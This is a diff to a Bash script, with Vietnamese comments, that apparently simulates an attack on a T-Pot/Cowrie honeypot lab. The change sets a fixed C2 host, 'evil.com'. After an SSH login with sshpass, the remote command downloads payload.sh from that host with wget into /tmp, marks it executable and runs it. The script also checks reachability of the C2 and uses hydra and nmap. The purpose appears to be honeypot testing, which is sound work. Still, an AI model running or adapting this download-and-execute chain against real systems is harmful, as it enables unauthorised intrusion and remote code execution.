@@ -8,6 +8,9 @@ TPOT_PORT="${3:-${TPOT_PORT:-22}}"
 usage() { echo "Usage: $0 <T-POT_IP> <KALI_IP> [TPOT_PORT]"; exit 1; }
 [[ -z "${TPOT_IP}" || -z "${KALI_IP}" ]] && usage
 
+# Host C2 cố định theo yêu cầu
+C2_HOST="evil.com"
+
 say()  { printf "%s\n" "$*"; }
 need() { command -v "$1" >/dev/null 2>&1 || { say "[!] Thiếu công cụ: $1"; exit 1; }; }
 for t in nmap hydra sshpass wget awk sed grep; do need "$t"; done
@@ -17,11 +20,11 @@ cleanup(){ rm -rf "$TMPDIR" 2>/dev/null || true; }
 trap cleanup EXIT
 
 # --- Kiểm tra C2: chỉ wget ---
-say "[*] Kiểm tra C2: http://${KALI_IP}:8080/payload.sh ..."
-if ! wget --spider -q --timeout=5 "http://${KALI_IP}:8080/payload.sh"; then
-  say "[!] Không truy cập được payload.sh tại ${KALI_IP}:8080"
-  say "    - Trên Kali:  cd ~/c2server && python3 -m http.server 8080"
-  say "    - Firewall:   sudo ufw allow 8080/tcp (nếu dùng ufw)"
+say "[*] Kiểm tra C2: http://${C2_HOST}/payload.sh ..."
+if ! wget --spider -q --timeout=5 "http://${C2_HOST}/payload.sh"; then
+  say "[!] Không truy cập được payload.sh tại ${C2_HOST}"
+  say "    - Trên Kali (hoặc máy C2):  cd ~/c2server && python3 -m http.server 8000"
+  say "    - Firewall:   sudo ufw allow 8000/tcp (nếu dùng ufw)"
   exit 2
 fi
 say "[+] C2 OK."
@@ -64,13 +67,13 @@ fi
 REMOTE_CMD='sh -c "
 cd /tmp;
 rm -f payload.sh;
-wget -q -O payload.sh http://'${KALI_IP}':8080/payload.sh;
+wget -q -O payload.sh http://'${C2_HOST}'/payload.sh;
 if [ ! -s payload.sh ]; then echo '\''[!] payload.sh rỗng/không tải được'\''; exit 10; fi;
 chmod +x payload.sh;
 sh payload.sh
 "'
 
-# --- SSH: dùng lại -tt để tránh 'exec request failed on channel 0' ---
+# --- SSH: dùng lại -tt để tránh '\''exec request failed on channel 0'\'' ---
 say "[*] SSH vào Cowrie & chạy payload (wget) ..."
 set +e
 sshpass -p "${PASS}" ssh \
@@ -87,9 +90,9 @@ SSH_RC=$?
 set -e
 
 if [[ ${SSH_RC} -ne 0 ]]; then
-  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). (Cowrie có thể đóng phiên sớm hoặc container không ra được KALI_IP:8080)"
+  say "[!] SSH/Payload lỗi (mã: ${SSH_RC}). (Cowrie có thể đóng phiên sớm hoặc container không ra được ${C2_HOST})"
   say "    Kiểm tra từ TRONG container Cowrie:"
-  say "      docker exec -it cowrie sh -lc \"wget -qO- http://${KALI_IP}:8080/payload.sh | head\""
+  say "      docker exec -it cowrie sh -lc \"wget -qO- http://${C2_HOST}/payload.sh | head\""
   exit 3
 fi
 
